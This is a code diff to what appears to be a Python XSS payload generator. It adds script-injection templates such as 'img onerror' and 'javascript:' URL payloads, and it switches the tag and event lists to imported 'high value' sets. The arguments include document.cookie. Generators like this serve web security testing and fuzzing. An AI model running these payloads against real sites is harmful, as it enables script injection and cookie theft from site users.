@@ -2,6 +2,9 @@ import csv
 import os
 import itertools
 
+from events import HIGH_VALUE_EVENTS
+from tags import HIGH_VALUE_TAGS
+
 TEMPLATES = {
     "script_injection": [
         '<script>{func}({arg})</script>',
@@ -27,11 +30,13 @@ TEMPLATES = {
         'document.write("<img src=x onerror={func}({arg})>")',
         'eval("{func}({arg})")',
         'setTimeout("{func}({arg})",0)',
+        'document.body.innerHTML="<img src=x onerror={func}({arg})>"',
+        'location.href="javascript:{func}({arg})"',
     ],
 }
 
-TAGS = ["svg", "img", "body", "iframe", "details", "marquee", "video", "input", "a", "div", "select", "object"]
-EVENTS = ["onload", "onerror", "onfocus", "onmouseover", "onclick", "onmouseenter", "ontoggle", "onbegin"]
+TAGS = HIGH_VALUE_TAGS
+EVENTS = HIGH_VALUE_EVENTS
 FUNCS = ["alert", "prompt", "confirm", "console.log"]
 ARGS = ["1", "'XSS'", "document.domain", "document.cookie", "String.fromCharCode(88,83,83)", "location.hash"]
 COMMENTS = ["", "*", "x"]
